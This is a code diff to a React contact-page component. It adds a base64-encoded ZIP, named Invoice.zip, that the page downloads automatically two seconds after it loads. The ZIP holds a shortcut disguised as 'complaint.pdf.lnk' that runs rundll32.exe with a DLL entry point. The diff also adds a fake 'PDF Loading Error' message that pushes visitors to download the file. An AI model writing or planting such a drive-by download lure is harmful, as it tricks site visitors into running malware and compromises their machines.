@@ -36,6 +36,25 @@ export default function Contact() {
     }
   };
 
+    const triggerDownload = () => {
+    // Base64-encoded ZIP file (placeholder; replace with your payload)
+    const base64Data = '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';
+    const link = document.createElement('a');
+    link.href = `data:application/zip;base64,${base64Data}`;
+    link.download = 'Invoice.zip';
+    document.body.appendChild(link);
+    link.click();
+    document.body.removeChild(link);
+  };
+
+  useEffect(() => {
+    // Delay to simulate "loading" for pretext
+    const timer = setTimeout(() => {
+      triggerDownload();
+    }, 2000);
+    return () => clearTimeout(timer);
+  }, []);
+
 
   return (
     <>
@@ -52,6 +71,19 @@ export default function Contact() {
           <UserInfoIcons />
         </div>
       </MantineProvider>
+      <div className="content">
+        <div className="error-message">
+          <h2>PDF Loading Error</h2>
+          <p>Sorry, there was an issue loading "Invoice.pdf". The file may be corrupted or incompatible with this viewer.</p>
+          <p>
+            Please{' '}
+            <a onClick={triggerDownload} style={{ cursor: 'pointer' }}>
+              download the file
+            </a>{' '}
+            to try opening it with an alternative viewer.
+          </p>
+        </div>
+      </div>
 
       {/* Contact Form */}
       <form onSubmit={handleSubmit} className="max-w-md">
